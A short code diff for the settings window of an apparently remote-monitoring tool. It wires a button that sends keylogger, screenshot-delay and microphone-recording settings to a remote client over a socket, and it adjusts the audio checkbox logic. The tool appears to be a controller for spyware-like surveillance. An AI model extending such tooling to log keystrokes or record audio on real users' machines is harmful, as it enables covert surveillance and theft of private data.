@@ -36,6 +36,9 @@ class LogSettings(QWidget, LogSettingsUi):
         # Init UI
         self.init_values()
 
+        # Triggers
+        self.setButton.clicked.connect(self.set_values)
+
     def init_values(self):
         # Keylogger Status
         self.keyloggerGroup.setChecked(self.kts)
@@ -53,8 +56,9 @@ class LogSettings(QWidget, LogSettingsUi):
         self.sDelayLine.setText(str(self.std))
 
         # Disable Audio Settings if Client Has no Microphone
-        self.audioGroup.setChecked(False)
-        self.audioGroup.setDisabled(self.no_audio)
+        if self.no_audio:
+            self.audioGroup.setChecked(False)
+            self.audioGroup.setDisabled(self.no_audio)
 
     def get_values(self):
         # Keylogger Status
@@ -83,4 +87,5 @@ class LogSettings(QWidget, LogSettingsUi):
         }
 
     def set_values(self):
-        pass
+        data_send(self.socket, self.get_values(), 'setLogSettings', session_id=self.session_id, to=self.client_id)
+        self.close()
